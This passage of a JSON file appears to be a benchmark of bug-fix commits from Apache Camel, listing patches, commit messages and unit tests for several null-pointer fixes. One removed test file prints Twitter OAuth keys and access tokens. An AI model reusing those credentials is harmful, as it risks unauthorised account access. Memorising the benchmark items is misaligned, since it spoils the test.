exchange.getProperty(configuration.getMqttTopicPropertyName());\n             if (topicValue != null) {\n                 topicName = topicValue.toString();\n             }\n-            mqttEndpoint.publish(topicName, body, qoS, retain);\n+            final String name = topicName;\n+\n+            try {\n+                log.debug(\"Publishing to {}\", name);\n+                mqttEndpoint.publish(name, body, qoS, retain, new Callback<Void>() {\n+                    @Override\n+                    public void onSuccess(Void aVoid) {\n+                        log.trace(\"onSuccess from {}\", name);\n+                        callback.done(false);\n+                    }\n+\n+                    @Override\n+                    public void onFailure(Throwable throwable) {\n+                        log.trace(\"onFailure from {}\", name);\n+                        exchange.setException(throwable);\n+                        callback.done(false);\n+                    }\n+                });\n+            } catch (Exception e) {\n+                exchange.setException(e);\n+                callback.done(true);\n+                return true;\n+            }\n+\n+            // we continue async, as the mqtt endpoint will invoke the callback when its done\n+            return false;\n+        } else {\n+            // no data to send so we are done\n+            log.trace(\"No data to publish\");\n+            callback.done(true);\n+            return true;\n         }\n     }\n }",
                "raw_url": "https://github.com/apache/camel/raw/7c9b538c1fa25cb8bc147fc9be69f0b4573f4d8c/components/camel-mqtt/src/main/java/org/apache/camel/component/mqtt/MQTTProducer.java",
                "sha": "530623a508da96d0af4f3740c045a3e1d0299564",
                "status": "modified"
            },
            {
                "additions": 0,
                "blob_url": "https://github.com/apache/camel/blob/7c9b538c1fa25cb8bc147fc9be69f0b4573f4d8c/components/camel-mqtt/src/test/java/org/apache/camel/component/mqtt/MQTTConfigurationTest.java",
                "changes": 1,
                "contents_url": "https://api.github.com/repos/apache/camel/contents/components/camel-mqtt/src/test/java/org/apache/camel/component/mqtt/MQTTConfigurationTest.java?ref=7c9b538c1fa25cb8bc147fc9be69f0b4573f4d8c",
                "deletions": 1,
                "filename": "components/camel-mqtt/src/test/java/org/apache/camel/component/mqtt/MQTTConfigurationTest.java",
                "patch": "@@ -23,7 +23,6 @@\n \n public class MQTTConfigurationTest extends MQTTBaseTest {\n \n-\n     @Test\n     public void testBasicConfiguration() throws Exception {\n         Endpoint endpoint = context.getEndpoint(\"mqtt:todo?byDefaultRetain=true&qualityOfService=exactlyOnce&publishTopicName=\" + TEST_TOPIC + \"&subscribeTopicName=\" + TEST_TOPIC);",
                "raw_url": "https://github.com/apache/camel/raw/7c9b538c1fa25cb8bc147fc9be69f0b4573f4d8c/components/camel-mqtt/src/test/java/org/apache/camel/component/mqtt/MQTTConfigurationTest.java",
                "sha": "2f19e186eed1cea9807df8e88ee0b77fa74941ba",
                "status": "modified"
            },
            {
                "additions": 3,
                "blob_url": "https://github.com/apache/camel/blob/7c9b538c1fa25cb8bc147fc9be69f0b4573f4d8c/components/camel-mqtt/src/test/java/org/apache/camel/component/mqtt/MQTTConsumerTest.java",
                "changes": 7,
                "contents_url": "https://api.github.com/repos/apache/camel/contents/components/camel-mqtt/src/test/java/org/apache/camel/component/mqtt/MQTTConsumerTest.java?ref=7c9b538c1fa25cb8bc147fc9be69f0b4573f4d8c",
                "deletions": 4,
                "filename": "components/camel-mqtt/src/test/java/org/apache/camel/component/mqtt/MQTTConsumerTest.java",
                "patch": "@@ -28,10 +28,8 @@\n \n public class MQTTConsumerTest extends MQTTBaseTest {\n \n-\n     @Test\n     public void testConsume() throws Exception {\n-\n         MQTT mqtt = new MQTT();\n         BlockingConnection publisherConnection = mqtt.blockingConnection();\n         Topic topic = new Topic(TEST_TOPIC, QoS.AT_MOST_ONCE);\n@@ -48,12 +46,13 @@ public void testConsume() throws Exception {\n         mock.assertIsSatisfied();\n     }\n \n-\n     protected RouteBuilder createRouteBuilder() {\n \n         return new RouteBuilder() {\n             public void configure() {\n-                from(\"mqtt:bar?subscribeTopicName=\" + TEST_TOPIC).transform(body().convertToString()).to(\"mock:result\");\n+                from(\"mqtt:bar?subscribeTopicName=\" + TEST_TOPIC)\n+                        .transform(body().convertToString())\n+                        .to(\"mock:result\");\n             }\n         };\n     }",
                "raw_url": "https://github.com/apache/camel/raw/7c9b538c1fa25cb8bc147fc9be69f0b4573f4d8c/components/camel-mqtt/src/test/java/org/apache/camel/component/mqtt/MQTTConsumerTest.java",
                "sha": "68700798644d14baa86ef8df1beb8620fd9ec894",
                "status": "modified"
            },
            {
                "additions": 0,
                "blob_url": "https://github.com/apache/camel/blob/7c9b538c1fa25cb8bc147fc9be69f0b4573f4d8c/components/camel-mqtt/src/test/java/org/apache/camel/component/mqtt/MQTTProducerTest.java",
                "changes": 4,
                "contents_url": "https://api.github.com/repos/apache/camel/contents/components/camel-mqtt/src/test/java/org/apache/camel/component/mqtt/MQTTProducerTest.java?ref=7c9b538c1fa25cb8bc147fc9be69f0b4573f4d8c",
                "deletions": 4,
                "filename": "components/camel-mqtt/src/test/java/org/apache/camel/component/mqtt/MQTTProducerTest.java",
                "patch": "@@ -33,7 +33,6 @@\n \n     @Test\n     public void testProduce() throws Exception {\n-\n         MQTT mqtt = new MQTT();\n         final BlockingConnection subscribeConnection = mqtt.blockingConnection();\n         subscribeConnection.connect();\n@@ -53,7 +52,6 @@ public void run() {\n                         e.printStackTrace();\n                         break;\n                     }\n-\n                 }\n             }\n         });\n@@ -69,9 +67,7 @@ public void run() {\n         assertTrue(\"Messages not consumed = \" + latch.getCount(), latch.getCount() == 0);\n     }\n \n-\n     protected RouteBuilder createRouteBuilder() {\n-\n         return new RouteBuilder() {\n             public void configure() {\n                 from(\"direct:foo\").to(\"mqtt:boo?publishTopicName=\" + TEST_TOPIC);",
                "raw_url": "https://github.com/apache/camel/raw/7c9b538c1fa25cb8bc147fc9be69f0b4573f4d8c/components/camel-mqtt/src/test/java/org/apache/camel/component/mqtt/MQTTProducerTest.java",
                "sha": "82ce669a84ad859f75a209b6a8973d139d408704",
                "status": "modified"
            },
            {
                "additions": 2,
                "blob_url": "https://github.com/apache/camel/blob/7c9b538c1fa25cb8bc147fc9be69f0b4573f4d8c/components/camel-mqtt/src/test/resources/log4j.properties",
                "changes": 4,
                "contents_url": "https://api.github.com/repos/apache/camel/contents/components/camel-mqtt/src/test/resources/log4j.properties?ref=7c9b538c1fa25cb8bc147fc9be69f0b4573f4d8c",
                "deletions": 2,
                "filename": "components/camel-mqtt/src/test/resources/log4j.properties",
                "patch": "@@ -21,7 +21,7 @@\n log4j.rootLogger=info, file\n \n #log4j.logger.twitter4j=DEBUG\n-#log4j.logger.org.apache.camel.component.mqttBUG\n+#log4j.logger.org.apache.camel.component.mqtt=DEBUG\n #log4j.logger.org.apache.camel=DEBUG\n \n # CONSOLE appender not used by default\n@@ -33,5 +33,5 @@ log4j.appender.out.layout.ConversionPattern=%d [%-15.15t] %-5p %-30.30c{1} - %m%\n log4j.appender.file=org.apache.log4j.FileAppender\n log4j.appender.file.layout=org.apache.log4j.PatternLayout\n log4j.appender.file.layout.ConversionPattern=%d [%-15.15t] %-5p %-30.30c{1} - %m%n\n-log4j.appender.file.file=target/camel-twitter-test.log\n+log4j.appender.file.file=target/camel-mqtt-test.log\n log4j.appender.file.append=true",
                "raw_url": "https://github.com/apache/camel/raw/7c9b538c1fa25cb8bc147fc9be69f0b4573f4d8c/components/camel-mqtt/src/test/resources/log4j.properties",
                "sha": "b15a0cd8283edf0572121212e8ebbfce128f7a86",
                "status": "modified"
            },
            {
                "additions": 0,
                "blob_url": "https://github.com/apache/camel/blob/618e285258599cc829cfa887468e66616a10e249/components/camel-mqtt/src/test/resources/test-options.properties",
                "changes": 22,
                "contents_url": "https://api.github.com/repos/apache/camel/contents/components/camel-mqtt/src/test/resources/test-options.properties?ref=618e285258599cc829cfa887468e66616a10e249",
                "deletions": 22,
                "filename": "components/camel-mqtt/src/test/resources/test-options.properties",
                "patch": "@@ -1,22 +0,0 @@\n-## ---------------------------------------------------------------------------\n-## Licensed to the Apache Software Foundation (ASF) under one or more\n-## contributor license agreements.  See the NOTICE file distributed with\n-## this work for additional information regarding copyright ownership.\n-## The ASF licenses this file to You under the Apache License, Version 2.0\n-## (the \"License\"); you may not use this file except in compliance with\n-## the License.  You may obtain a copy of the License at\n-##\n-## http://www.apache.org/licenses/LICENSE-2.0\n-##\n-## Unless required by applicable law or agreed to in writing, software\n-## distributed under the License is distributed on an \"AS IS\" BASIS,\n-## WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.\n-## See the License for the specific language governing permissions and\n-## limitations under the License.\n-## ---------------------------------------------------------------------------\n-\n-#This uses the Twitter 'cameltweet' account for testing purposes.\n-consumer.key=NMqaca1bzXsOcZhP2XlwA\n-consumer.secret=VxNQiRLwwKVD0K9mmfxlTTbVdgRpriORypnUbHhxeQw\n-access.token=26693234-W0YjxL9cMJrC0VZZ4xdgFMymxIQ10LeL1K8YlbBY\n-access.token.secret=BZD51BgzbOdFstWZYsqB5p5dbuuDV12vrOdatzhY4E\n\\ No newline at end of file",
                "raw_url": "https://github.com/apache/camel/raw/618e285258599cc829cfa887468e66616a10e249/components/camel-mqtt/src/test/resources/test-options.properties",
                "sha": "a4dd8b6c9140a2bb7c81da5136b19c5dbb9f08b7",
                "status": "removed"
            }
        ],
        "message": "CAMEL-5670: Fixed NPE in MQTT publish. Refactored code to leverage async routing engine. Polished code.\n\ngit-svn-id: https://svn.apache.org/repos/asf/camel/trunk@1395085 13f79535-47bb-0310-9956-ffa450edef68",
        "parent": "https://github.com/apache/camel/commit/618e285258599cc829cfa887468e66616a10e249",
        "patched_files": [
            "log4j.java",
            "MQTTConfiguration.java",
            "MQTTEndpoint.java",
            "MQTTProducer.java",
            "MQTTConsumer.java",
            "MQTTComponent.java"
        ],
        "repo": "camel",
        "unit_tests": [
            "MQTTConfigurationTest.java",
            "test-options.java",
            "MQTTConsumerTest.java",
            "MQTTProducerTest.java"
        ]
    },
    "camel_7edd77c": {
        "bug_id": "camel_7edd77c",
        "commit": "https://github.com/apache/camel/commit/7edd77c02efd97dd147466ddc3e63231cc9e687f",
        "file": [
            {
                "additions": 12,
                "blob_url": "https://github.com/apache/camel/blob/7edd77c02efd97dd147466ddc3e63231cc9e687f/camel-core/src/main/java/org/apache/camel/impl/DefaultExchangeHolder.java",
                "changes": 17,
                "contents_url": "https://api.github.com/repos/apache/camel/contents/camel-core/src/main/java/org/apache/camel/impl/DefaultExchangeHolder.java?ref=7edd77c02efd97dd147466ddc3e63231cc9e687f",
                "deletions": 5,
                "filename": "camel-core/src/main/java/org/apache/camel/impl/DefaultExchangeHolder.java",
                "patch": "@@ -70,7 +70,7 @@\n     /**\n      * Creates a payload object with the information from the given exchange.\n      *\n-     * @param exchange the exchange\n+     * @param exchange the exchange, must <b>not</b> be <tt>null</tt>\n      * @return the holder object with information copied form the exchange\n      */\n     public static DefaultExchangeHolder marshal(Exchange exchange) {\n@@ -80,11 +80,13 @@ public static DefaultExchangeHolder marshal(Exchange exchange) {\n     /**\n      * Creates a payload object with the information from the given exchange.\n      *\n-     * @param exchange the exchange\n+     * @param exchange the exchange, must <b>not</b> be <tt>null</tt>\n      * @param includeProperties whether or not to include exchange properties\n      * @return the holder object with information copied form the exchange\n      */\n     public static DefaultExchangeHolder marshal(Exchange exchange, boolean includeProperties) {\n+        ObjectHelper.notNull(exchange, \"exchange\");\n+\n         // we do not support files\n         Object body = exchange.getIn().getBody();\n         if (body instanceof WrappedFile || body instanceof File) {\n@@ -112,10 +114,13 @@ public static DefaultExchangeHolder marshal(Exchange exchange, boolean includePr\n     /**\n      * Transfers the information from the payload to the exchange.\n      *\n-     * @param exchange the exchange to set values from the payload\n-     * @param payload  the payload with the values\n+     * @param exchange the exchange to set values from the payload, must <b>not</b> be <tt>null</tt>\n+     * @param payload  the payload with the values, must <b>not</b> be <tt>null</tt>\n      */\n     public static void unmarshal(Exchange exchange, DefaultExchangeHolder payload) {\n+        ObjectHelper.notNull(exchange, \"exchange\");\n+        ObjectHelper.notNull(payload, \"payload\");\n+\n         exchange.setExchangeId(payload.exchangeId);\n         exchange.getIn().setBody(payload.inBody);\n         if (payload.inHeaders != null) {\n@@ -126,7 +131,9 @@ public static void unmarshal(Exchange exchange, DefaultExchangeHolder payload) {\n             if (payload.outHeaders != null) {\n                 exchange.getOut().setHeaders(payload.outHeaders);\n             }\n-            exchange.getOut().setFault(payload.outFaultFlag.booleanValue());\n+            if (payload.outFaultFlag != null) {\n+                exchange.getOut().setFault(payload.outFaultFlag);\n+            }\n         }\n         if (payload.properties != null) {\n             for (String key : payload.properties.keySet()) {",
                "raw_url": "https://github.com/apache/camel/raw/7edd77c02efd97dd147466ddc3e63231cc9e687f/camel-core/src/main/java/org/apache/camel/impl/DefaultExchangeHolder.java",
                "sha": "cad02f41eb5ada9329fa8ff2c5d65d8e655b6d07",
                "status": "modified"
            }
        ],
        "message": "CAMEL-6218: Added not null check to avoid NPE exceptions.\n\ngit-svn-id: https://svn.apache.org/repos/asf/camel/trunk@1462919 13f79535-47bb-0310-9956-ffa450edef68",
        "parent": "https://github.com/apache/camel/commit/363b94487c243c19d7cc6dbff4cddff746cad885",
        "patched_files": [
            "DefaultExchangeHolder.java"
        ],
        "repo": "camel",
        "unit_tests": [
            "DefaultExchangeHolderTest.java"
        ]
    },
    "camel_81137b2": {
        "bug_id": "camel_81137b2",
        "commit": "https://github.com/apache/camel/commit/81137b2af1f06c82be32a13a61ba24dd48ef8892",
        "file": [
            {
                "additions": 15,
                "blob_url": "https://github.com/apache/camel/blob/81137b2af1f06c82be32a13a61ba24dd48ef8892/components/camel-jetty-common/src/main/java/org/apache/camel/component/jetty/JettyHttpProducer.java",
                "changes": 15,
                "contents_url": "https://api.github.com/repos/apache/camel/contents/components/camel-jetty-common/src/main/java/org/apache/camel/component/jetty/JettyHttpProducer.java?ref=81137b2af1f06c82be32a13a61ba24dd48ef8892",
                "deletions": 0,
                "filename": "components/camel-jetty-common/src/main/java/org/apache/camel/component/jetty/JettyHttpProducer.java",
                "patch": "@@ -21,6 +21,7 @@\n import java.io.Serializable;\n import java.net.CookieStore;\n import java.net.URI;\n+import java.net.URISyntaxException;\n import java.util.ArrayList;\n import java.util.Iterator;\n import java.util.List;\n@@ -115,6 +116,20 @@ private void processInternal(Exchange exchange, AsyncCallback callback) throws E\n \n         JettyContentExchange httpExchange = getEndpoint().createContentExchange();\n         httpExchange.init(exchange, getBinding(), client, callback);\n+\n+        // url must have scheme\n+        try {\n+            uri = new URI(url);\n+            String scheme = uri.getScheme();\n+            if (scheme == null) {\n+                throw new IllegalArgumentException(\"Url must include scheme: \" + url + \". If you are bridging endpoints set bridgeEndpoint=true.\"\n+                        + \" If you want to call a specific url, then you may need to remove all CamelHttp* headers in the route before this.\"\n+                        + \" See more details at: http://camel.apache.org/how-to-remove-the-http-protocol-headers-in-the-camel-message.html\");\n+            }\n+        } catch (URISyntaxException e) {\n+            // ignore\n+        }\n+\n         httpExchange.setURL(url); // Url has to be set first\n         httpExchange.setMethod(methodName);\n         ",
                "raw_url": "https://github.com/apache/camel/raw/81137b2af1f06c82be32a13a61ba24dd48ef8892/components/camel-jetty-common/src/main/java/org/apache/camel/component/jetty/JettyHttpProducer.java",
                "sha": "9de51f645f3123aac54dc5176a7100d1f4a6e7f0",
                "status": "modified"
            },
            {
                "additions": 52,
                "blob_url": "https://github.com/apache/camel/blob/81137b2af1f06c82be32a13a61ba24dd48ef8892/components/camel-jetty9/src/test/java/org/apache/camel/component/jetty/rest/RestBridgeEndpointTest.java",
                "changes": 52,
                "contents_url": "https://api.github.com/repos/apache/camel/contents/components/camel-jetty9/src/test/java/org/apache/camel/component/jetty/rest/RestBridgeEndpointTest.java?ref=81137b2af1f06c82be32a13a61ba24dd48ef8892",
                "deletions": 0,
                "filename": "components/camel-jetty9/src/test/java/org/apache/camel/component/jetty/rest/RestBridgeEndpointTest.java",
                "patch": "@@ -0,0 +1,52 @@\n+/**\n+ * Licensed to the Apache Software Foundation (ASF) under one or more\n+ * contributor license agreements.  See the NOTICE file distributed with\n+ * this work for additional information regarding copyright ownership.\n+ * The ASF licenses this file to You under the Apache License, Version 2.0\n+ * (the \"License\"); you may not use this file except in compliance with\n+ * the License.  You may obtain a copy of the License at\n+ *\n+ *      http://www.apache.org/licenses/LICENSE-2.0\n+ *\n+ * Unless required by applicable law or agreed to in writing, software\n+ * distributed under the License is distributed on an \"AS IS\" BASIS,\n+ * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.\n+ * See the License for the specific language governing permissions and\n+ * limitations under the License.\n+ */\n+package org.apache.camel.component.jetty.rest;\n+\n+import org.apache.camel.builder.RouteBuilder;\n+import org.apache.camel.component.jetty.BaseJettyTest;\n+import org.junit.Test;\n+\n+public class RestBridgeEndpointTest extends BaseJettyTest {\n+\n+    @Test\n+    public void testJettyBridgeEndpoint() throws Exception {\n+        getMockEndpoint(\"mock:result\").expectedMessageCount(1);\n+\n+        String out = template.requestBody(\"http://localhost:\" + getPort() + \"/api/123/\", null, String.class);\n+        assertEquals(\"Bye 123\", out);\n+\n+        assertMockEndpointsSatisfied();\n+    }\n+\n+    @Override\n+    protected RouteBuilder createRouteBuilder() throws Exception {\n+        return new RouteBuilder() {\n+            @Override\n+            public void configure() throws Exception {\n+                // configure to use jetty on localhost with the given port\n+                restConfiguration().component(\"jetty\").host(\"localhost\").port(getPort());\n+\n+                rest(\"/api/\").get(\"/{id}/\").to(\"jetty:http://localhost:\" + getPort2() + \"?bridgeEndpoint=true\");\n+\n+                from(\"jetty:http://localhost:\" + getPort2() + \"?matchOnUriPrefix=true\")\n+                    .to(\"mock:result\")\n+                    .transform().simple(\"Bye ${header.id}\");\n+            }\n+        };\n+    }\n+\n+}",
                "raw_url": "https://github.com/apache/camel/raw/81137b2af1f06c82be32a13a61ba24dd48ef8892/components/camel-jetty9/src/test/java/org/apache/camel/component/jetty/rest/RestBridgeEndpointTest.java",
                "sha": "dc856986a176f2307c4f6f959e73eb2ddb1f0799",
                "status": "added"
            },
            {
                "additions": 56,
                "blob_url": "https://github.com/apache/camel/blob/81137b2af1f06c82be32a13a61ba24dd48ef8892/components/camel-jetty9/src/test/java/org/apache/camel/component/jetty/rest/RestNoBridgeEndpointTest.java",
                "changes": 56,
                "contents_url": "https://api.github.com/repos/apache/camel/contents/components/camel-jetty9/src/test/java/org/apache/camel/component/jetty/rest/RestNoBridgeEndpointTest.java?ref=81137b2af1f06c82be32a13a61ba24dd48ef8892",
                "deletions": 0,
                "filename": "components/camel-jetty9/src/test/java/org/apache/camel/component/jetty/rest/RestNoBridgeEndpointTest.java",
                "patch": "@@ -0,0 +1,56 @@\n+/**\n+ * Licensed to the Apache Software Foundation (ASF) under one or more\n+ * contributor license agreements.  See the NOTICE file distributed with\n+ * this work for additional information regarding copyright ownership.\n+ * The ASF licenses this file to You under the Apache License, Version 2.0\n+ * (the \"License\"); you may not use this file except in compliance with\n+ * the License.  You may obtain a copy of the License at\n+ *\n+ *      http://www.apache.org/licenses/LICENSE-2.0\n+ *\n+ * Unless required by applicable law or agreed to in writing, software\n+ * distributed under the License is distributed on an \"AS IS\" BASIS,\n+ * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.\n+ * See the License for the specific language governing permissions and\n+ * limitations under the License.\n+ */\n+package org.apache.camel.component.jetty.rest;\n+\n+import org.apache.camel.builder.RouteBuilder;\n+import org.apache.camel.component.jetty.BaseJettyTest;\n+import org.junit.Test;\n+\n+public class RestNoBridgeEndpointTest extends BaseJettyTest {\n+\n+    @Test\n+    public void testJettyNoBridgeEndpoint() throws Exception {\n+        getMockEndpoint(\"mock:result\").expectedMessageCount(1);\n+\n+        String out = template.requestBody(\"http://localhost:\" + getPort() + \"/api/123/\", null, String.class);\n+        assertEquals(\"Bye 123\", out);\n+\n+        assertMockEndpointsSatisfied();\n+    }\n+\n+    @Override\n+    protected RouteBuilder createRouteBuilder() throws Exception {\n+        return new RouteBuilder() {\n+            @Override\n+            public void configure() throws Exception {\n+                // configure to use jetty on localhost with the given port\n+                restConfiguration().component(\"jetty\").host(\"localhost\").port(getPort());\n+\n+                rest(\"/api/\").get(\"/{id}/\").to(\"direct:foo\");\n+\n+                from(\"direct:foo\")\n+                    .removeHeaders(\"CamelHttp*\")\n+                    .to(\"jetty:http://localhost:\" + getPort2());\n+\n+                from(\"jetty:http://localhost:\" + getPort2() + \"?matchOnUriPrefix=true\")\n+                    .to(\"mock:result\")\n+                    .transform().simple(\"Bye ${header.id}\");\n+            }\n+        };\n+    }\n+\n+}",
                "raw_url": "https://github.com/apache/camel/raw/81137b2af1f06c82be32a13a61ba24dd48ef8892/components/camel-jetty9/src/test/java/org/apache/camel/component/jetty/rest/RestNoBridgeEndpointTest.java",
                "sha": "fe8967b406b99f54f663938db9467ca82e237064",
                "status": "added"
            }
        ],
        "message": "CAMEL-10539: Jetty http producer bridge endpoint should avoid NPE error and detect invalid uri and provide exception with suggestions what to do.",
        "parent": "https://github.com/apache/camel/commit/3ac821873bf07a1aca775d8d52a46e06663de663",
        "patched_files": [
            "JettyHttpProducer.java"
        ],
        "repo": "camel",
        "unit_tests": [
            "RestNoBridgeEndpointTest.java",
            "RestBridgeEndpointTest.java"
        ]
    },
    "camel_82419d2": {
        "bug_id": "camel_82419d2",
        "commit": "https://github.com/apache/camel/commit/82419d206c23c37882fa8786fe012c5b47240ddc",
        "file": [
            {
                "additions": 3,
                "blob_url": "https://github.com/apache/camel/blob/82419d206c23c37882fa8786fe012c5b47240ddc/camel-core/src/main/java/org/apache/camel/impl/DefaultCamelContext.java",
                "changes": 6,
                "contents_url": "https://api.github.com/repos/apache/camel/contents/camel-core/src/main/java/org/apache/camel/impl/DefaultCamelContext.java?ref=82419d206c23c37882fa8786fe012c5b47240ddc",
                "deletions": 3,
                "filename": "camel-core/src/main/java/org/apache/camel/impl/DefaultCamelContext.java",
                "patch": "@@ -244,6 +244,7 @@ public DefaultCamelContext() {\n         // setup management strategy first since end users may use it to add event notifiers\n         // using the management strategy before the CamelContext has been started\n         this.managementStrategy = createManagementStrategy();\n+        this.managementMBeanAssembler = createManagementMBeanAssembler();\n \n         Container.Instance.manage(this);\n     }\n@@ -1550,9 +1551,6 @@ private void doStartCamel() throws Exception {\n             // use the classloader that loaded this class\n             setApplicationContextClassLoader(this.getClass().getClassLoader());\n         }\n-        if (managementMBeanAssembler == null) {\n-            managementMBeanAssembler = createManagementMBeanAssembler();\n-        }\n \n         if (log.isDebugEnabled()) {\n             log.debug(\"Using ClassResolver={}, PackageScanClassResolver={}, ApplicationContextClassLoader={}\",\n@@ -2484,6 +2482,8 @@ public void disableJMX() {\n             throw new IllegalStateException(\"Disabling JMX can only be done when CamelContext has not been started\");\n         }\n         managementStrategy = new DefaultManagementStrategy(this);\n+        // must clear lifecycle strategies as we add DefaultManagementLifecycleStrategy by default for JMX support\n+        lifecycleStrategies.clear();\n     }\n \n     public InflightRepository getInflightRepository() {",
                "raw_url": "https://github.com/apache/camel/raw/82419d206c23c37882fa8786fe012c5b47240ddc/camel-core/src/main/java/org/apache/camel/impl/DefaultCamelContext.java",
                "sha": "70390f371c351e89d63c3dfbb8819755fdc553e8",
                "status": "modified"
            },
            {
                "additions": 0,
                "blob_url": "https://github.com/apache/camel/blob/82419d206c23c37882fa8786fe012c5b47240ddc/camel-core/src/main/java/org/apache/camel/management/DefaultManagementAgent.java",
                "changes": 3,
                "contents_url": "https://api.github.com/repos/apache/camel/contents/camel-core/src/main/java/org/apache/camel/management/DefaultManagementAgent.java?ref=82419d206c23c37882fa8786fe012c5b47240ddc",
                "deletions": 3,
                "filename": "camel-core/src/main/java/org/apache/camel/management/DefaultManagementAgent.java",
                "patch": "@@ -265,9 +265,6 @@ public boolean isRegistered(ObjectName name) {\n     protected void doStart() throws Exception {\n         ObjectHelper.notNull(camelContext, \"CamelContext\");\n \n-        // must add management lifecycle strategy\n-        camelContext.getLifecycleStrategies().add(0, new DefaultManagementLifecycleStrategy(camelContext));\n-\n         // create mbean server if is has not be injected.\n         if (server == null) {\n             finalizeSettings();",
                "raw_url": "https://github.com/apache/camel/raw/82419d206c23c37882fa8786fe012c5b47240ddc/camel-core/src/main/java/org/apache/camel/management/DefaultManagementAgent.java",
                "sha": "d2e57fb442e2ec0b283f830e00074a1cce66458d",
                "status": "modified"
            },
            {
                "additions": 4,
                "blob_url": "https://github.com/apache/camel/blob/82419d206c23c37882fa8786fe012c5b47240ddc/camel-core/src/main/java/org/apache/camel/management/ManagementStrategyFactory.java",
                "changes": 4,
                "contents_url": "https://api.github.com/repos/apache/camel/contents/camel-core/src/main/java/org/apache/camel/management/ManagementStrategyFactory.java?ref=82419d206c23c37882fa8786fe012c5b47240ddc",
                "deletions": 0,
                "filename": "camel-core/src/main/java/org/apache/camel/management/ManagementStrategyFactory.java",
                "patch": "@@ -35,6 +35,10 @@ public ManagementStrategy create(CamelContext context, boolean disableJMX) {\n         } else {\n             try {\n                 answer = new ManagedManagementStrategy(context, new DefaultManagementAgent(context));\n+\n+                // must add management lifecycle strategy\n+                context.getLifecycleStrategies().add(0, new DefaultManagementLifecycleStrategy(context));\n+\n             } catch (Exception e) {\n                 log.warn(\"Cannot create JMX lifecycle strategy. Will fallback and disable JMX.\", e);\n                 answer = new DefaultManagementStrategy(context);",
                "raw_url": "https://github.com/apache/camel/raw/82419d206c23c37882fa8786fe012c5b47240ddc/camel-core/src/main/java/org/apache/camel/management/ManagementStrategyFactory.java",
                "sha": "814d5ac2ec890c0f1bee2a155602285be1ddd0f6",
                "status": "modified"
            }
        ],
        "message": "CAMEL-6576: Improved initializaiton logic of ManagementStrategy to avoid contention as well a potential NPE.",
        "parent": "https://github.com/apache/camel/commit/2c9ff0172980aea8a359d78f1190b33317dd3d8e",
        "patched_files": [
            "DefaultCamelContext.java"
        ],
        "repo": "camel",
        "unit_tests": [
            "DefaultCamelContextTest.java"
        ]
    },
    "camel_8314bfe": {
        "bug_id": "camel_8314bfe",
        "commit": "https://github.com/apache/camel/commit/8314bfe7a976bb42afc3bfd7c34591d83cbed3d9",
        "file": [
            {
                "additions": 15,
                "blob_url": "https://github.com/apache/camel/blob/8314bfe7a976bb42afc3bfd7c34591d83cbed3d9/camel-core/src/main/java/org/apache/camel/impl/DefaultCamelContext.java",
                "changes": 15,
                "contents_url": "https://api.github.com/repos/apache/camel/contents/camel-core/src/main/java/org/apache/camel/impl/DefaultCamelContext.java?ref=8314bfe7a976bb42afc3bfd7c34591d83cbed3d9",
                "deletions": 0,
                "filename": "camel-core/src/main/java/org/apache/camel/impl/DefaultCamelContext.java",
                "patch": "@@ -733,6 +733,11 @@ public Processor getProcessor(String id) {\n     }\n \n     public <T extends ManagedProcessorMBean> T getManagedProcessor(String id, Class<T> type) {\n+        // jmx must be enabled\n+        if (getManagementStrategy().getManagementAgent() == null) {\n+            return null;\n+        }\n+\n         Processor processor = getProcessor(id);\n         ProcessorDefinition def = getProcessorDefinition(id);\n \n@@ -749,6 +754,11 @@ public Processor getProcessor(String id) {\n     }\n \n     public <T extends ManagedRouteMBean> T getManagedRoute(String routeId, Class<T> type) {\n+        // jmx must be enabled\n+        if (getManagementStrategy().getManagementAgent() == null) {\n+            return null;\n+        }\n+\n         Route route = getRoute(routeId);\n \n         if (route != null) {\n@@ -764,6 +774,11 @@ public Processor getProcessor(String id) {\n     }\n \n     public ManagedCamelContextMBean getManagedCamelContext() {\n+        // jmx must be enabled\n+        if (getManagementStrategy().getManagementAgent() == null) {\n+            return null;\n+        }\n+\n         try {\n             ObjectName on = getManagementStrategy().getManagementNamingStrategy().getObjectNameForCamelContext(this);\n             return getManagementStrategy().getManagementAgent().newProxyClient(on, ManagedCamelContextMBean.class);",
                "raw_url": "https://github.com/apache/camel/raw/8314bfe7a976bb42afc3bfd7c34591d83cbed3d9/camel-core/src/main/java/org/apache/camel/impl/DefaultCamelContext.java",
                "sha": "bbc33776994435af5e1d85172467ef8956e1bb17",
                "status": "modified"
            }
        ],
        "message": "Fixed potential NPE if JMX not enabled",
        "parent": "https://github.com/apache/camel/commit/c65b632ddc973a1c5c7c724bc34ce0759bc3c0af",
        "patched_files": [
            "DefaultCamelContext.java"
        ],
        "repo": "camel",
        "unit_tests": [
            "DefaultCamelContextTest.java"
        ]
    },
    "camel_833f466": {
        "bug_id": "camel_833f466",
        "commit": "https://github.com/apache/camel/commit/833f466746fc74a4110601f65fc3189f42b7ec88",
        "file": [
            {
                "additions": 1,
                "blob_url": "https://github.com/apache/camel/blob/833f466746fc74a4110601f65fc3189f42b7ec88/components/camel-cometd/pom.xml",
                "changes": 2,
                "contents_url": "https://api.github.com/repos/apache/camel/contents/components/camel-cometd/pom.xml?ref=833f466746fc74a4110601f65fc3189f42b7ec88",
                "deletions": 1,
                "filename": "components/camel-cometd/pom.xml",
                "patch": "@@ -76,7 +76,7 @@\n                 <groupId>org.codehaus.mojo</groupId>\n                 <artifactId>exec-maven-plugin</artifactId>\n                 <configuration>\n-                    <mainClass>org.apache.camel.component.cometd.CometdProducerConsumerInteractiveTest</mainClass>\n+                    <mainClass>org.apache.camel.component.cometd.CometdProducerConsumerInteractiveMain</mainClass>\n                     <includePluginDependencies>false</includePluginDependencies>\n                 </configuration>\n             </plugin>",
                "raw_url": "https://github.com/apache/camel/raw/833f466746fc74a4110601f65fc3189f42b7ec88/components/camel-cometd/pom.xml",
                "sha": "5a6ab3e32c025c878751398ffb61d5bf98af0829",
                "status": "modified"
            },
            {
                "additions": 13,
                "blob_url": "https://github.com/apache/camel/blob/833f466746fc74a4110601f65fc3189f42b7ec88/components/camel-cometd/src/main/java/org/apache/camel/component/cometd/CometdComponent.java",
                "changes": 34,
                "contents_url": "https://api.github.com/repos/apache/camel/contents/components/camel-cometd/src/main/java/org/apache/camel/component/cometd/CometdComponent.java?ref=833f466746fc74a4110601f65fc3189f42b7ec88",
                "deletions": 21,
